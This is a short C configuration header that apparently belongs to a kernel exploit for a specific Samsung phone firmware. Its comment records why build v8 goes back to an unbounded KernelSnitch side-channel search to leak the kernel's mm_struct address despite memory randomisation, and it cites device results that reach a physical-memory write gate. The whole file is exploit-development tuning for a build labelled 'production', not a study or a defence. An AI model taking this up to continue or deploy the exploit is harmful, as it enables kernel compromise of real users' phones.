#include "../q6q-F9560ZCU3DZDP-v7/target.h"

/* v8: restore the v2 search configuration that reached the physical gate.
 *
 * v4-v7 inherited the e1s/e2s Exynos "SLUB safety bounds" (identity end
 * 0xffffff8080000000, object indices 27..30) and - unlike those profiles -
 * activated them with APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION. On the e2s
 * records those defines were inert: set_search_bounds() is only compiled in
 * when BOTH APP_KERNEL_PAGE_KSNITCH_IDENTITY_END and
 * APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION are defined, and the e2s header
 * lacks the latter. The device-tested e2s mm_struct leak ran the default
 * 64 GiB identity window [KERNELSNITCH_IDENTITY_START, IDENTITY_END] with all
 * object indices, and its first MTE-aware run found mm_struct at
 * ffffff8c66b2a1c0 - far beyond the 2 GiB window that v4-v7 restricted the
 * q6q search to.
 *
 * q6q evidence agrees: the v2 run (no object-index or partition bounds) found
 * mm_struct at object_index=12 and reached the physical gate
 * (write_window=1, p0 physical write status=0, p0 gate hits=1), while v4-v7
 * with the tightened bounds never leak mm_struct at all ("KernelSnitch
 * mm_struct leak failed" after every retry). The q6q linear map is
 * randomized (CONFIG_RANDOMIZE_MEMORY), so mm_struct can sit far outside a
 * fixed 2 GiB window depending on the per-boot seed.
 *
 * v8 therefore reverts to the default full-window, all-index search by
 * removing the exact-partition activation and the index/max-base rejections,
 * while keeping every v7 improvement (0x800 futex hash table for the 8-CPU
 * q6q kernel, MTE-off profile, direct-source P0 table with inverse slide).
 */
#undef APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION
#undef APP_KERNEL_PAGE_KSNITCH_IDENTITY_END
#undef APP_SLIDE_MIN_OBJECT_INDEX
#undef APP_SLIDE_MAX_OBJECT_INDEX
#undef APP_FOPS_MIN_OBJECT_INDEX
#undef APP_RECLAIM_MAX_DIRECT_BASE
#undef BUILD_VARIANT_LABEL
#define BUILD_VARIANT_LABEL \
  "q6q-F9560ZCU3DZDP-app-production-v8-unbounded-search"
